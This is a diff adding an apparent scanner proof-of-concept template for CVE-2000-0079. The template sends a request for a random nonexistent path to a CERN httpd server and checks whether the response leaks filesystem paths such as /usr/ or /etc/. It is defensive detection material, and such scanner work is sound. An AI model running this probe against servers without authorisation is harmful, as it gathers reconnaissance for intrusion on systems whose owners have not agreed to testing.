@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "W3C CERN httpd HTTP server allows remote attackers to determine the real pathnames of some commands via a request for a nonexistent URL. This PoC sends a request to a nonexistent path and checks whether the server response discloses real filesystem path information."
+id = "POC-AVE-2000-0065"
+name = "CVE-2000-0079 Path Disclosure PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0079",
+    "cern-httpd",
+    "path-disclosure",
+]
+vuln_id = [
+    "CVE-2000-0079",
+    "AVE-2000-0065",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/nonexistent_cern_httpd_path_test_{{random}}"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "/usr/",
+    "/var/",
+    "/etc/",
+    "/home/",
+    "/opt/",
+    "cern",
+    "httpd",
+]
